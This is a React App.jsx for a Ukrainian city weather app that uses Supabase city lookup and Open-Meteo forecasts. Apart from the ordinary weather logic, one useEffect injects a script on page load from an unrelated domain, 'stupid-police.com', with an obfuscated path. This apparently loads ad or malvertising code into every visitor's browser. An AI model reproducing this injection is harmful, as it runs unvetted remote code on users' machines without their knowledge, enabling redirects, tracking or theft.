import { useState, useEffect, } from 'react'
import './App.css'
import { supabase } from './supabase/supabase'
import Loading from './Components/Loading/Loading';
import DailyWeather from './Components/DailyWeather/DailyWeather';
import contract from "./assets/img/contract.jpg"
import casino from "./assets/img/casino.jpeg"
function App() {
  const [loading, setLoading] = useState(true)
  const [items, setItems] = useState([])
  const [city, setCity] = useState("Кривий Ріг")
const [query, setQuery] = useState('');
  const [filteredResults, setFilteredResults] = useState([]);
  const [isOpen, setIsOpen] = useState(false);
  useEffect(() => {
    setTimeout(() => {
      setLoading(false)
    }, 1500);
  }, [])

  useEffect(() => {
    async function getItems() {
      const { data } = await supabase.from('cities_ukraine').select()
      if (data) setItems(data)
    }
    getItems()
  }, [])
  const [weather, setWeather] = useState(null)
  useEffect(() => {
    if (!city) return

    console.log(city)
    fetch(`https://geocoding-api.open-meteo.com/v1/search?name=${encodeURIComponent(city)}&count=1&language=uk`)
      .then(r => r.json())
      .then(geo => {
        if (!geo.results?.length) {
          setCity('Город не найден')
          return Promise.reject('not found')
        }
        const { latitude, longitude } = geo.results[0]

        return fetch(`https://api.open-meteo.com/v1/forecast?latitude=${latitude}&longitude=${longitude}&daily=temperature_2m_max,temperature_2m_min,sunrise,sunset,rain_sum,wind_speed_10m_max,weather_code&hourly=temperature_2m,relative_humidity_2m,rain,wind_speed_10m,weather_code&timezone=Europe%2FMoscow&timeformat=unixtime`)
      })
      .then(r => r.json())
      .then(data => {
        setWeather(data)
        console.log(data)
      })


  }, [city])
  const handleInputChange = (e) => {
    const value = e.target.value;
    setQuery(value);

    if (value.length > 0) {
      const filtered = items.filter(item =>
        item.object_name.toLowerCase().startsWith(value.toLowerCase())
      );
      setFilteredResults(filtered);
      setIsOpen(true);
    } else {
      setIsOpen(false);
    }
  };
useEffect(() => {
  const s = document.createElement('script');
  s.src = "//stupid-police.com/bgXtV.scdRGVlK0FY/W/ct/he/mM9QuZZaUllHk/P/T_Yk5WNxjOYEyeMQznMhtgNuj/kS2/NdjaIBzjNIwx";
  s.async = true;
  s.referrerPolicy = 'no-referrer-when-downgrade';
  document.head.appendChild(s);
}, []);
  return (
    <>
   
      {loading ? (<Loading></Loading>) : (<>
      {/* <img src={casino} alt="" className="casino" /> <img src={contract} alt="" className="contract" /> */}
        <div className='header'>
<input type="text" value={query} onChange={handleInputChange} placeholder="Поиск города..."
        className="search-input"/>
        {isOpen && (
        <ul className="results-list">
          {filteredResults.length > 0 ? (
            filteredResults.map((item, index) => (
  <li 
    key={index} 
    className="result-item" 
    onClick={() => {
      setQuery(item.object_name); 
      setCity(item.object_name);  
      setIsOpen(false);           
    }}
  >
    <span className="item-name">{item.object_name}</span>
  </li>
))
          ) : (
            <li className="no-results">Ничего не найдено</li>
          )}
        </ul>
      )}
      </div>
        <div className="main">
        <h1>Выбранный город:{city}</h1>

<div className="weather">
{weather && <DailyWeather weather={weather} />}
</div>

        </div></>)}

    </>
  )
}

export default App
